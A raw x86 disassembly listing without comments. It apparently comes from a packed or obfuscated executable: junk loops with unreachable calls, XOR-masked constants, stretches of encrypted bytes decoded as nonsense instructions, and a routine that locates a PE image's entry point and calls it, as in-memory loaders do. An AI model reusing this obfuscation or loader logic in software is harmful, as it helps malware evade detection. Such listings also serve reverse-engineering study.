  409bde:	xchg   ebp,eax
  409bdf:	mov    bh,BYTE PTR [edx-0x4c60d80]
  409be5:	pop    ebp
  409be6:	and    eax,0x8a3e1c
  409beb:	sbb    bl,BYTE PTR [edx-0xefe297e]
  409bf1:	cmp    dl,cl
  409bf3:	adc    eax,0x7ba7b7e3
  409bf8:	in     al,dx
  409bf9:	sub    DWORD PTR [eax-0x4b515838],ecx
  409bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c00:	jae    0x409c02
  409c02:	cmp    ah,dl
  409c04:	mov    ds:0x78edd281,eax
  409c09:	mov    ebp,0x1b8b6f05
  409c0e:	jns    0x409bd2
  409c10:	mov    gs,WORD PTR [ecx+0x3ec21ae1]
  409c16:	mov    ah,0xe2
  409c18:	shl    DWORD PTR [edx],0x97
  409c1b:	xor    ebp,DWORD PTR [edx]
  409c1d:	pop    ecx
  409c1e:	or     BYTE PTR ds:0x676ec3b0,al
  409c24:	daa    
  409c25:	mov    BYTE PTR [ecx],bh
  409c27:	aaa    
  409c28:	enter  0xca7b,0x2f
  409c2c:	sub    BYTE PTR [ebp+0x29],cl
  409c2f:	mov    ebx,0xd96ce0d
  409c34:	enter  0x7af5,0x55
  409c38:	mov    dl,BYTE PTR [eax-0x10368ca5]
  409c3e:	pop    ecx
  409c3f:	lahf   
  409c40:	push   0xffffffe3
  409c42:	stc    
  409c43:	xor    BYTE PTR [eax-0x2d],cl
  409c46:	stos   BYTE PTR es:[edi],al
  409c47:	push   edx
  409c48:	cs test al,0x6b
  409c4b:	in     al,dx
  409c4c:	add    BYTE PTR es:[ecx+0x7df77cde],dh
  409c53:	daa    
  409c54:	(bad)  
  409c55:	and    DWORD PTR [eax+edi*4],ebp
  409c58:	or     DWORD PTR [eax],esi
  409c5a:	shl    DWORD PTR [eax-0x3977dc4a],1
  409c60:	add    edx,DWORD PTR [ebx]
  409c62:	daa    
  409c63:	add    ah,BYTE PTR [ebp+0x31]
  409c66:	push   ebx
  409c67:	ja     0x409c49
  409c69:	add    ebp,eax
  409c6b:	out    0x31,eax
  409c6d:	retf   
  409c6e:	jge    0x409c77
  409c70:	push   edi
  409c71:	push   ss
  409c72:	jb     0x409c56
  409c74:	icebp  
  409c75:	aas    
  409c76:	popa   
  409c77:	test   BYTE PTR [ebx-0x5b5997e4],dl
  409c7d:	inc    ecx
  409c7e:	bound  ecx,QWORD PTR [eax]
  409c80:	sub    edi,DWORD PTR ds:0x2223dba1
  409c86:	js     0x409c26
  409c88:	gs adc dh,bl
  409c8b:	(bad)  
  409c8c:	pusha  
  409c8d:	adc    al,BYTE PTR [edi-0x593c080a]
  409c93:	cs inc eax
  409c95:	mov    eax,0xa0fd164c
  409c9a:	ret    
  409c9b:	dec    ecx
  409c9c:	bound  ecx,QWORD PTR [esi]
  409c9e:	mov    edi,DWORD PTR [ebp+edx*4+0x1ad5d5e]
  409ca5:	int    0xf7
  409ca7:	pop    eax
  409ca8:	jle    0x409cef
  409caa:	jne    0x409cf8
  409cac:	icebp  
  409cad:	jnp    0x409cd2
  409caf:	out    0xcb,al
  409cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cb2:	das    
  409cb3:	int    0xf3
  409cb5:	sbb    DWORD PTR [ecx],eax
  409cb7:	mov    dh,0xff
  409cb9:	xor    ecx,DWORD PTR [ebx+0x17c8f201]
  409cbf:	mov    al,0x71
  409cc1:	xor    edi,ebp
  409cc3:	mov    dh,0xd6
  409cc5:	mov    DWORD PTR ds:0x8d93efad,eax
  409ccb:	out    dx,al
  409ccc:	cmp    eax,0x653a6bc7
  409cd1:	xor    edx,eax
  409cd3:	mov    edi,0xffcd8d64
  409cd8:	sub    edi,edx
  409cda:	add    edi,DWORD PTR [ebp-0x10]
  409cdd:	mov    edx,DWORD PTR [ebp-0x20]
  409ce0:	mov    ebx,DWORD PTR [ebp-0x8]
  409ce3:	xor    edx,eax
  409ce5:	add    edx,ecx
  409ce7:	imul   edx,ebx
  409cea:	cmp    edx,edi
  409cec:	jbe    0x407fba
  409cf2:	pop    ebx
  409cf3:	pop    edi
  409cf4:	leave  
  409cf5:	ret    0x8
  409cf8:	push   ebp
  409cf9:	mov    ebp,esp
  409cfb:	sub    esp,0x70
  409cfe:	xor    DWORD PTR ds:0x4343fa,0x600e
  409d08:	push   0x4162b4
  409d0d:	call   DWORD PTR ds:0x432db6
  409d13:	test   ax,ax
  409d16:	jne    0x409d2d
  409d1c:	add    DWORD PTR ds:0x432e62,0x43440a
  409d26:	xor    eax,eax
  409d28:	jmp    0x40a478
  409d2d:	call   DWORD PTR ds:0x432e12
  409d33:	cdq    
  409d34:	mov    DWORD PTR ds:0x432e52,0x2a3f
  409d3e:	cmp    eax,0x98216565
  409d43:	jne    0x409d55
  409d49:	cmp    edx,0x98798767
  409d4f:	je     0x409d1c
  409d55:	push   0x4162c0
  409d5a:	sub    DWORD PTR ds:0x432e52,0x490f
  409d64:	call   DWORD PTR ds:0x432d22
  409d6a:	add    DWORD PTR ds:0x4344a1,0x7629
  409d74:	test   eax,eax
  409d76:	mov    DWORD PTR ds:0x432e42,0x36af
  409d80:	jne    0x409d1c
  409d86:	sub    DWORD PTR ds:0x4344a1,0x434495
  409d90:	push   ebx
  409d91:	xor    DWORD PTR ds:0x432784,ecx
  409d97:	mov    ebx,0xf89c8531
  409d9c:	or     ecx,0x58cd
  409da2:	mov    DWORD PTR [ebp-0x8],ebx
  409da5:	xor    DWORD PTR ds:0x4344a9,0x5f13
  409daf:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  409db6:	and    DWORD PTR ds:0x43441a,0x0
  409dc0:	jmp    0x409dd2
  409dc5:	mov    ecx,DWORD PTR ds:0x43441a
  409dcb:	inc    ecx
  409dcc:	mov    DWORD PTR ds:0x43441a,ecx
  409dd2:	cmp    DWORD PTR ds:0x43441a,0x10
  409dd9:	jae    0x409e48
  409ddf:	cmp    DWORD PTR ds:0x43441a,0x13
  409de6:	jne    0x409dfc
  409dec:	push   0x4328b3
  409df1:	push   0x432798
  409df6:	call   DWORD PTR ds:0x432d7e
  409dfc:	jmp    0x409dc5
  409e01:	and    DWORD PTR ds:0x434422,0x0
  409e0b:	mov    ecx,DWORD PTR ds:0x434422
  409e11:	inc    ecx
  409e12:	mov    DWORD PTR ds:0x434422,ecx
  409e18:	cmp    DWORD PTR ds:0x434422,0x20
  409e1f:	jne    0x409e3b
  409e25:	push   DWORD PTR [ebp-0x1c]
  409e28:	push   DWORD PTR [ebp-0x10]
  409e2b:	push   0x1942
  409e30:	push   0x6344
  409e35:	call   DWORD PTR ds:0x432d82
  409e3b:	cmp    DWORD PTR ds:0x434422,0x1e
  409e42:	jb     0x409e0b
  409e48:	lea    eax,[ebp-0x18]
  409e4b:	sub    DWORD PTR ds:0x4344ad,0x379b
  409e55:	mov    DWORD PTR [ebp-0x14],eax
  409e58:	lea    eax,[ebp-0x1c]
  409e5b:	and    DWORD PTR ds:0x432780,0x0
  409e65:	mov    ecx,DWORD PTR ds:0x432780
  409e6b:	inc    ecx
  409e6c:	mov    DWORD PTR ds:0x432780,ecx
  409e72:	cmp    DWORD PTR ds:0x432780,0x20
  409e79:	jne    0x409e98
  409e7f:	push   DWORD PTR [ebp-0xc]
  409e82:	push   DWORD PTR [ebp-0x10]
  409e85:	push   0x37d5
  409e8a:	push   0x73f1
  409e8f:	push   DWORD PTR [ebp-0x1c]
  409e92:	call   DWORD PTR ds:0x432a56
  409e98:	cmp    DWORD PTR ds:0x432780,0x18
  409e9f:	jb     0x409e65
  409ea5:	and    DWORD PTR ds:0x43276c,0x0
  409eaf:	mov    ecx,DWORD PTR ds:0x43276c
  409eb5:	inc    ecx
  409eb6:	mov    DWORD PTR ds:0x43276c,ecx
  409ebc:	cmp    DWORD PTR ds:0x43276c,0x19
  409ec3:	jne    0x409ed4
  409ec9:	push   0x477f
  409ece:	call   DWORD PTR ds:0x432a5a
  409ed4:	cmp    DWORD PTR ds:0x43276c,0x13
  409edb:	jb     0x409eaf
  409ee1:	mov    ecx,DWORD PTR ds:0x432e56
  409ee7:	xor    DWORD PTR ds:0x43441e,ecx
  409eed:	mov    DWORD PTR [ebp-0xc],eax
  409ef0:	and    DWORD PTR ds:0x432774,0x0
  409efa:	jmp    0x409f0d
  409eff:	xor    eax,eax
  409f01:	add    eax,DWORD PTR ds:0x432774
  409f07:	inc    eax
  409f08:	mov    ds:0x432774,eax
  409f0d:	cmp    DWORD PTR ds:0x432774,0x1a
  409f14:	jae    0x409f4f
  409f1a:	cmp    DWORD PTR ds:0x432774,0x21
  409f21:	jne    0x409f4a
  409f27:	push   0x432e66
  409f2c:	push   DWORD PTR [ebp-0x28]
  409f2f:	push   DWORD PTR [ebp-0x18]
  409f32:	push   0x87ba
  409f37:	push   0x20df
  409f3c:	push   0x519b
  409f41:	push   DWORD PTR [ebp-0x18]
  409f44:	call   DWORD PTR ds:0x432d86
  409f4a:	jmp    0x409eff
  409f4f:	mov    eax,ds:0x4161a0
  409f54:	mov    DWORD PTR ds:0x432774,0x19
  409f5e:	cmp    DWORD PTR ds:0x432774,0x0
  409f65:	je     0x409fb2
  409f6b:	cmp    DWORD PTR ds:0x432774,0x21
  409f72:	jne    0x409fa0
  409f78:	push   0x2812
  409f7d:	push   0x6a58
  409f82:	push   DWORD PTR [ebp-0x24]
  409f85:	push   0x8f98
  409f8a:	push   DWORD PTR [ebp-0x20]
  409f8d:	push   0x26e4
  409f92:	push   DWORD PTR [ebp-0x14]
  409f95:	push   0x43292b
  409f9a:	call   DWORD PTR ds:0x432d8a
  409fa0:	mov    ecx,DWORD PTR ds:0x432774
  409fa6:	dec    ecx
  409fa7:	mov    DWORD PTR ds:0x432774,ecx
  409fad:	jmp    0x409f5e
  409fb2:	mov    eax,DWORD PTR [eax+0x1c8]
  409fb8:	xor    DWORD PTR ds:0x432774,edx
  409fbe:	mov    eax,DWORD PTR [eax]
  409fc0:	mov    ecx,DWORD PTR [ebp-0xc]
  409fc3:	add    DWORD PTR ds:0x432770,0x3eda
  409fcd:	push   esi
  409fce:	mov    esi,0x7510855
  409fd3:	sbb    DWORD PTR ds:0x434495,0x118a
  409fdd:	xor    eax,esi
  409fdf:	sbb    DWORD PTR ds:0x43440e,0x4343fa
  409fe9:	push   edi
  409fea:	xor    edi,DWORD PTR ds:0x43440a
  409ff0:	mov    edi,0x32729c
  409ff5:	adc    DWORD PTR ds:0x434495,0x7b86
  409fff:	add    eax,edi
  40a001:	mov    DWORD PTR [ecx],eax
  40a003:	mov    eax,ds:0x4163b4
  40a008:	mov    DWORD PTR ds:0x432e5e,0x674a
  40a012:	cmp    eax,0x23c13046
  40a017:	mov    eax,DWORD PTR [ebp-0x4]
  40a01a:	je     0x40a046
  40a020:	mov    ecx,DWORD PTR [ebp-0x8]
  40a023:	xor    eax,esi
  40a025:	sub    DWORD PTR ds:0x432774,0x7cc4
  40a02f:	add    eax,edi
  40a031:	add    DWORD PTR ds:0x434406,0x432774
  40a03b:	imul   eax,ecx
  40a03e:	mov    DWORD PTR [ebp-0x8],eax
  40a041:	jmp    0x40a156
  40a046:	and    DWORD PTR ds:0x432e5e,0x0
  40a050:	mov    ecx,DWORD PTR ds:0x432e5e
  40a056:	inc    ecx
  40a057:	mov    DWORD PTR ds:0x432e5e,ecx
  40a05d:	cmp    DWORD PTR ds:0x432e5e,0x26
  40a064:	jne    0x40a07d
  40a06a:	push   DWORD PTR [ebp-0x18]
  40a06d:	push   0x709e
  40a072:	push   0x1359
  40a077:	call   DWORD PTR ds:0x432d8e
  40a07d:	cmp    DWORD PTR ds:0x432e5e,0x19
  40a084:	jb     0x40a050
  40a08a:	xor    eax,esi
  40a08c:	and    DWORD PTR ds:0x434416,0x0
  40a096:	mov    ecx,DWORD PTR ds:0x434416
  40a09c:	inc    ecx
  40a09d:	mov    DWORD PTR ds:0x434416,ecx
  40a0a3:	cmp    DWORD PTR ds:0x434416,0x10
  40a0aa:	jne    0x40a0c0
  40a0b0:	push   0x432885
  40a0b5:	push   0x43289d
  40a0ba:	call   DWORD PTR ds:0x432a5e
  40a0c0:	cmp    DWORD PTR ds:0x434416,0xf
  40a0c7:	jne    0x40a0da
  40a0cd:	mov    ecx,DWORD PTR ds:0x434416
  40a0d3:	inc    ecx
  40a0d4:	mov    DWORD PTR ds:0x434416,ecx
  40a0da:	cmp    DWORD PTR ds:0x434416,0x1e
  40a0e1:	jb     0x40a096
  40a0e7:	add    eax,edi
  40a0e9:	mov    ds:0x4162b0,eax
  40a0ee:	mov    ecx,DWORD PTR ds:0x4343e6
  40a0f4:	sbb    DWORD PTR ds:0x434495,ecx
  40a0fa:	mov    eax,DWORD PTR [ebp-0x8]
  40a0fd:	sbb    ecx,DWORD PTR ds:0x432e56
  40a103:	xor    eax,esi
  40a105:	not    ecx
  40a107:	add    eax,edi
  40a109:	mov    ds:0x4163b4,eax
  40a10e:	mov    eax,DWORD PTR [ebp-0x4]
  40a111:	mov    ecx,DWORD PTR ds:0x4162b0
  40a117:	sub    DWORD PTR ds:0x432770,0x434495
  40a121:	xor    eax,esi
  40a123:	add    eax,edi
  40a125:	mov    DWORD PTR ds:0x434412,0x307
  40a12f:	cmp    ecx,eax
  40a131:	jne    0x40a156
  40a137:	xor    DWORD PTR ds:0x432e4e,0x57b5
  40a141:	push   DWORD PTR [ebp-0x4]
  40a144:	sub    DWORD PTR ds:0x434499,0x6bc5
  40a14e:	push   DWORD PTR [ebp-0x8]
  40a151:	call   0x40a47c
  40a156:	mov    eax,ds:0x4161a0
  40a15b:	mov    eax,DWORD PTR [eax+0x18c]
  40a161:	xor    ecx,ecx
  40a163:	mov    eax,DWORD PTR [eax]
  40a165:	sbb    DWORD PTR ds:0x434491,edx
  40a16b:	mov    DWORD PTR [ebp-0x20],eax
  40a16e:	inc    edx
  40a16f:	mov    eax,0xf89c853d
  40a174:	mov    DWORD PTR [ebp-0x24],eax
  40a177:	or     DWORD PTR ds:0x4343ea,edx
  40a17d:	mov    DWORD PTR [ebp-0x24],eax
  40a180:	and    DWORD PTR ds:0x43441a,0x0
  40a18a:	jmp    0x40a19c
  40a18f:	mov    edx,DWORD PTR ds:0x43441a
  40a195:	inc    edx
  40a196:	mov    DWORD PTR ds:0x43441a,edx
  40a19c:	cmp    DWORD PTR ds:0x43441a,0x10
  40a1a3:	jae    0x40a1f4
  40a1a9:	cmp    DWORD PTR ds:0x43441a,0x6
  40a1b0:	jne    0x40a1d3
  40a1b6:	push   0x1088
  40a1bb:	push   DWORD PTR [ebp-0x1c]
  40a1be:	push   0x185d
  40a1c3:	push   0x432989
  40a1c8:	push   0x400000
  40a1cd:	call   DWORD PTR ds:0x432a62
  40a1d3:	cmp    DWORD PTR ds:0x43441a,0x5
  40a1da:	jne    0x40a1ef
  40a1e0:	xor    edx,edx
  40a1e2:	or     edx,DWORD PTR ds:0x43441a
  40a1e8:	inc    edx
  40a1e9:	mov    DWORD PTR ds:0x43441a,edx
  40a1ef:	jmp    0x40a18f
  40a1f4:	mov    DWORD PTR [ebp-0x24],eax
  40a1f7:	mov    DWORD PTR [ebp-0xc],ebx
  40a1fa:	mov    DWORD PTR [ebp-0x24],eax
  40a1fd:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40a204:	mov    ebx,DWORD PTR [ebp-0x8]
  40a207:	and    edx,DWORD PTR ds:0x43441a
  40a20d:	mov    ecx,DWORD PTR [ebp-0x4]
  40a210:	and    DWORD PTR ds:0x432e4e,0x0
  40a21a:	mov    edx,DWORD PTR ds:0x432e4e
  40a220:	inc    edx
  40a221:	mov    DWORD PTR ds:0x432e4e,edx
  40a227:	cmp    DWORD PTR ds:0x432e4e,0x22
  40a22e:	jne    0x40a23a
  40a234:	call   DWORD PTR ds:0x432a66
  40a23a:	cmp    DWORD PTR ds:0x432e4e,0x17
  40a241:	jb     0x40a21a
  40a247:	mov    edx,DWORD PTR [ebp-0x4]
  40a24a:	xor    edx,esi
  40a24c:	xor    ecx,esi
  40a24e:	add    ecx,edx
  40a250:	mov    edx,DWORD PTR [ebp-0x4]
  40a253:	xor    ebx,esi
  40a255:	xor    edx,esi
  40a257:	add    ebx,edi
  40a259:	lea    ecx,[ecx+edx*1+0x9757d4]
  40a260:	cmp    ebx,ecx
  40a262:	ja     0x40a2c3
  40a268:	mov    eax,DWORD PTR [ebp-0x4]
  40a26b:	xor    eax,esi
  40a26d:	lea    eax,[eax+ebx*1+0x32729c]
  40a274:	push   eax
  40a275:	mov    eax,DWORD PTR [ebp-0xc]
  40a278:	xor    eax,esi
  40a27a:	lea    eax,[ebp+eax*1+0x3272a4]
  40a281:	push   eax
  40a282:	mov    eax,ds:0x4161a0
  40a287:	push   DWORD PTR [eax+0x1bc]
  40a28d:	call   0x401a05
  40a292:	mov    eax,DWORD PTR [ebp-0x4]
  40a295:	xor    eax,esi
  40a297:	lea    ebx,[ebx+eax*1+0x32729c]
  40a29e:	mov    eax,DWORD PTR [ebp-0x4]
  40a2a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a4:	xor    ecx,esi
  40a2a6:	xor    eax,esi
  40a2a8:	add    eax,ecx
  40a2aa:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2ad:	xor    ecx,esi
  40a2af:	lea    eax,[eax+ecx*1+0x9757d4]
  40a2b6:	cmp    ebx,eax
  40a2b8:	jbe    0x40a268
  40a2be:	mov    eax,0xf89c853d
  40a2c3:	mov    ecx,DWORD PTR [ebp+0xc]
  40a2c6:	mov    DWORD PTR ds:0x416024,ecx
  40a2cc:	mov    ecx,DWORD PTR [ebp+0x10]
  40a2cf:	mov    DWORD PTR ds:0x416278,ecx
  40a2d5:	mov    ecx,DWORD PTR ds:0x416024
  40a2db:	mov    edx,DWORD PTR [ebp-0x14]
  40a2de:	sub    ecx,edi
  40a2e0:	xor    ecx,esi
  40a2e2:	mov    DWORD PTR [edx],ecx
  40a2e4:	mov    ecx,DWORD PTR [ebp-0x18]
  40a2e7:	cmp    ecx,0xf89c8530
  40a2ed:	je     0x40a34a
  40a2f3:	mov    ecx,DWORD PTR [ebp-0x8]
  40a2f6:	mov    edx,DWORD PTR [ebp-0x1c]
  40a2f9:	xor    ecx,esi
  40a2fb:	add    ecx,edi
  40a2fd:	cmp    ecx,edx
  40a2ff:	je     0x40a34a
  40a305:	mov    eax,ds:0x4161a0
  40a30a:	mov    eax,DWORD PTR [eax+0x194]
  40a310:	mov    ecx,DWORD PTR [eax]
  40a312:	mov    eax,DWORD PTR [ecx+0x3c]
  40a315:	push   DWORD PTR ds:0x416278
  40a31b:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a31f:	push   DWORD PTR ds:0x416024
  40a325:	add    eax,ecx
  40a327:	mov    ecx,DWORD PTR ds:0x4161a0
  40a32d:	mov    ecx,DWORD PTR [ecx+0x194]
  40a333:	push   DWORD PTR [ecx]
  40a335:	call   eax
  40a337:	mov    ecx,DWORD PTR ds:0x4161a0
  40a33d:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a343:	mov    DWORD PTR [ecx],eax
  40a345:	jmp    0x40a45a
  40a34a:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34d:	mov    edx,DWORD PTR [ebp-0x20]
  40a350:	xor    ecx,esi
  40a352:	add    ecx,edi
  40a354:	cmp    ecx,edx
  40a356:	jne    0x40a43d
  40a35c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a35f:	xor    ecx,esi
  40a361:	add    ecx,edi
  40a363:	mov    DWORD PTR ds:0x416224,ecx
  40a369:	mov    ecx,DWORD PTR [ebp-0x8]
  40a36c:	xor    ecx,esi
  40a36e:	add    ecx,edi
  40a370:	mov    DWORD PTR ds:0x41621c,ecx
  40a376:	mov    ecx,DWORD PTR [ebp-0x4]
  40a379:	mov    DWORD PTR [ebp-0xc],ecx
  40a37c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a37f:	mov    DWORD PTR [ebp+0xc],ecx
  40a382:	mov    ecx,DWORD PTR [ebp+0xc]
  40a385:	xor    ecx,esi
  40a387:	add    ecx,edi
  40a389:	mov    DWORD PTR [ebp+0xc],ecx
  40a38c:	mov    ecx,DWORD PTR ds:0x416020
  40a392:	mov    ecx,DWORD PTR [ecx]
  40a394:	mov    DWORD PTR [ebp+0xc],ecx
  40a397:	mov    ecx,DWORD PTR ds:0x416228
  40a39d:	mov    ecx,DWORD PTR [ecx]
  40a39f:	mov    DWORD PTR [ebp-0x14],ecx
  40a3a2:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40a3a9:	mov    ecx,DWORD PTR [ebp+0x10]
  40a3ac:	xor    ecx,esi
  40a3ae:	add    ecx,edi
  40a3b0:	mov    DWORD PTR [ebp+0x10],ecx
  40a3b3:	mov    ecx,DWORD PTR ds:0x4161a0
  40a3b9:	mov    DWORD PTR [ebp+0x10],ecx
  40a3bc:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3bf:	mov    DWORD PTR [ebp+0xc],ecx
  40a3c2:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3c5:	push   0x4
  40a3c7:	pop    edx
  40a3c8:	sub    edx,ecx
  40a3ca:	add    edx,DWORD PTR [ebp-0x14]
  40a3cd:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40a3d4:	mov    DWORD PTR [ebp+0x10],edx
  40a3d7:	mov    DWORD PTR [ebp-0x70],eax
  40a3da:	mov    eax,DWORD PTR [ebp+0xc]
  40a3dd:	mov    DWORD PTR [ebp-0x6c],eax
  40a3e0:	mov    eax,DWORD PTR [ebp+0x10]
  40a3e3:	mov    DWORD PTR [ebp-0x68],eax
  40a3e6:	mov    eax,DWORD PTR [ebp-0x24]
  40a3e9:	xor    eax,esi
  40a3eb:	add    eax,edi
  40a3ed:	mov    DWORD PTR [ebp-0x64],eax
  40a3f0:	lea    eax,[ebp-0x2c]
  40a3f3:	mov    DWORD PTR [ebp-0x60],eax
  40a3f6:	mov    eax,DWORD PTR [ebp-0x70]
  40a3f9:	xor    eax,esi
  40a3fb:	add    eax,edi
  40a3fd:	mov    DWORD PTR [ebp-0x70],eax
  40a400:	lea    eax,[ebp-0x70]
  40a403:	push   eax
  40a404:	mov    eax,DWORD PTR [ebp-0xc]
  40a407:	xor    eax,esi
  40a409:	add    eax,edi
  40a40b:	push   eax
  40a40c:	mov    eax,ds:0x4161c0
  40a411:	push   0x416116
  40a416:	push   DWORD PTR [eax]
  40a418:	call   0x40d076
  40a41d:	xor    esi,esi
  40a41f:	mov    eax,DWORD PTR [ebp+0x10]
  40a422:	sub    eax,esi
  40a424:	push   eax
  40a425:	mov    eax,DWORD PTR [ebp+0xc]
  40a428:	add    eax,esi
  40a42a:	push   eax
  40a42b:	call   0x407765
  40a430:	inc    esi
  40a431:	cmp    esi,0x52
  40a434:	jb     0x40a41f
  40a43a:	mov    eax,DWORD PTR [ebp-0xc]
  40a43d:	call   0x405bf4
  40a442:	lea    eax,[ebp+0x4]
  40a445:	mov    DWORD PTR [ebp-0x28],eax
  40a448:	mov    eax,DWORD PTR [ebp-0x10]
  40a44b:	mov    eax,DWORD PTR [ebp-0x4]
  40a44e:	push   DWORD PTR [ebp-0x8]
  40a451:	lea    eax,[ebp-0x28]
  40a454:	push   eax
  40a455:	call   0x40c78b
  40a45a:	mov    eax,ds:0x4161a0
  40a45f:	push   0x4
  40a461:	add    eax,0x1cc
  40a466:	push   eax
  40a467:	lea    eax,[ebp-0x10]
  40a46a:	push   eax
  40a46b:	call   0x401a05
  40a470:	mov    eax,DWORD PTR [ebp-0x10]
  40a473:	mov    eax,DWORD PTR [eax]
  40a475:	pop    edi
  40a476:	pop    esi
  40a477:	pop    ebx
  40a478:	leave  
  40a479:	ret    0xc
  40a47c:	push   ebp
  40a47d:	mov    ebp,esp
  40a47f:	sub    esp,0x24
  40a482:	xor    ecx,ecx
  40a484:	or     ecx,DWORD PTR ds:0x4344a5
  40a48a:	sub    ecx,DWORD PTR ds:0x4344ad
  40a490:	mov    DWORD PTR ds:0x4344a5,ecx
  40a496:	mov    eax,ds:0x4161a0
  40a49b:	mov    DWORD PTR ds:0x434412,0x17
  40a4a5:	cmp    DWORD PTR ds:0x434412,0x0
  40a4ac:	je     0x40a506
  40a4b2:	cmp    DWORD PTR ds:0x434412,0x5
  40a4b9:	jne    0x40a4d4
  40a4bf:	push   0x378d
  40a4c4:	push   0x4343fa
  40a4c9:	push   0x4a36
  40a4ce:	call   DWORD PTR ds:0x432cd6
  40a4d4:	cmp    DWORD PTR ds:0x434412,0x6
  40a4db:	jne    0x40a4ee
  40a4e1:	mov    ecx,DWORD PTR ds:0x434412
  40a4e7:	dec    ecx
  40a4e8:	mov    DWORD PTR ds:0x434412,ecx
  40a4ee:	mov    ecx,DWORD PTR ds:0x434412
  40a4f4:	dec    ecx
  40a4f5:	mov    DWORD PTR ds:0x434412,ecx
  40a4fb:	jmp    0x40a4a5
  40a500:	add    DWORD PTR ds:0x432e66,edx
  40a506:	mov    eax,DWORD PTR [eax+0x198]
  40a50c:	mov    ecx,DWORD PTR ds:0x4344e5
  40a512:	mov    ecx,DWORD PTR [ecx]
  40a514:	sub    DWORD PTR ds:0x4343f2,ecx
  40a51a:	mov    DWORD PTR [ebp-0x8],eax
  40a51d:	xor    eax,eax
  40a51f:	add    eax,DWORD PTR ds:0x4343e6
  40a525:	and    eax,DWORD PTR ds:0x432774
  40a52b:	mov    ds:0x4343e6,eax
  40a530:	mov    eax,DWORD PTR [ebp+0x8]
  40a533:	mov    ecx,DWORD PTR [ebp-0x8]
  40a536:	sub    DWORD PTR ds:0x432e5e,0x432770
  40a540:	push   ebx
  40a541:	adc    DWORD PTR ds:0x434416,ebx
  40a547:	push   esi
  40a548:	mov    esi,0x7510855
  40a54d:	and    DWORD PTR ds:0x432e4a,0x0
  40a557:	mov    ebx,DWORD PTR ds:0x432e4a
  40a55d:	inc    ebx
  40a55e:	mov    DWORD PTR ds:0x432e4a,ebx
  40a564:	cmp    DWORD PTR ds:0x432e4a,0x2c
  40a56b:	jne    0x40a57a
  40a571:	push   DWORD PTR [ebp-0xc]
  40a574:	call   DWORD PTR ds:0x432cda
  40a57a:	cmp    DWORD PTR ds:0x432e4a,0x1e
  40a581:	jb     0x40a557
  40a587:	xor    eax,esi
  40a589:	and    DWORD PTR ds:0x434422,0x0
  40a593:	jmp    0x40a5a5
  40a598:	mov    ebx,DWORD PTR ds:0x434422
  40a59e:	inc    ebx
  40a59f:	mov    DWORD PTR ds:0x434422,ebx
  40a5a5:	cmp    DWORD PTR ds:0x434422,0x1a
  40a5ac:	jae    0x40a78c
  40a5b2:	cmp    DWORD PTR ds:0x434422,0x1d
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x74a9
  40a5c4:	push   0x3c30
  40a5c9:	call   DWORD PTR ds:0x432cde
  40a5cf:	jmp    0x40a598
  40a5d4:	jmp    0x40a78c
  40a5d9:	cmp    dh,BYTE PTR [esi+0x69734bd3]
  40a5df:	inc    edx
  40a5e0:	mov    ch,0x74
  40a5e2:	neg    DWORD PTR [ebx-0x6]
  40a5e5:	dec    esi
  40a5e6:	inc    ebx
  40a5e7:	push   0x43
  40a5e9:	shl    al,cl
  40a5eb:	jo     0x40a65d
  40a5ed:	xchg   ebp,eax
  40a5ee:	jg     0x40a660
  40a5f0:	jo     0x40a601
  40a5f2:	shr    BYTE PTR [esi+ecx*1+0x68],cl
  40a5f6:	inc    esp
  40a5f7:	inc    edi
  40a5f8:	dec    esi
  40a5f9:	mov    esi,0x284af12f
  40a5fe:	cmp    eax,0x493d22d6
  40a603:	sbb    DWORD PTR [eax+0x77],esi
  40a606:	dec    esi
  40a607:	jmp    0x40a62a
  40a609:	xchg   BYTE PTR [esi+0x42794547],bl
  40a60f:	pop    ds
  40a610:	cmp    eax,0xa5aab9e1
  40a615:	pop    eax
  40a616:	(bad)  
  40a617:	bound  ebp,QWORD PTR [ecx-0x40b42593]
  40a61d:	jmp    0x40a5aa
  40a61f:	mov    eax,ds:0x2da0512d
  40a624:	inc    ecx
  40a625:	aam    0x93
  40a627:	mov    ds:0x1343966,al
  40a62c:	lods   al,BYTE PTR ds:[esi]
  40a62d:	mov    edi,0x1c4cedf5
  40a632:	cmp    ebp,DWORD PTR [eax+0x72]
  40a635:	dec    esp
  40a636:	cmp    eax,0x9e83b1ba
  40a63b:	sbb    eax,0xc36ecfb
  40a640:	mov    dl,0x9e
  40a642:	and    al,0x6c
  40a644:	and    BYTE PTR [eax],ch
  40a646:	mov    edx,0x371387e6
  40a64b:	mov    eax,ds:0xc403dd8d
  40a650:	fsubr  st(3),st
  40a652:	pop    ebx
  40a653:	imul   ch
  40a655:	mov    ebp,0x661deed1
  40a65a:	mov    edi,0x8ffc950a
  40a65f:	cs sub ch,dl
  40a662:	imul   BYTE PTR [edx+ebp*2]
  40a665:	das    
  40a666:	(bad)  
  40a668:	mul    bl
  40a66a:	and    edx,DWORD PTR [ebp+0xbc14001]
  40a670:	shl    BYTE PTR [ecx+0x735fb607],1
  40a676:	repnz mov ecx,0x33ebbf11
  40a67c:	adc    eax,0x8eb3dd54
  40a681:	lds    edx,FWORD PTR [esi-0x621ca87d]
  40a687:	imul   edi,ecx,0xffffffc0
  40a68a:	cmp    al,BYTE PTR [ebx-0x61cf6ac2]
  40a690:	call   0x3c99:0xdd8c6381
  40a697:	mov    ecx,0xfc173487
  40a69c:	push   eax
  40a69d:	dec    edx
  40a69e:	(bad)  
  40a69f:	jmp    0xab194bc1
  40a6a4:	sub    DWORD PTR [eax],ecx
  40a6a6:	add    DWORD PTR [eax],esp
  40a6a8:	adc    WORD PTR [esi-0x43],cx
  40a6ac:	push   esi
  40a6ad:	push   es
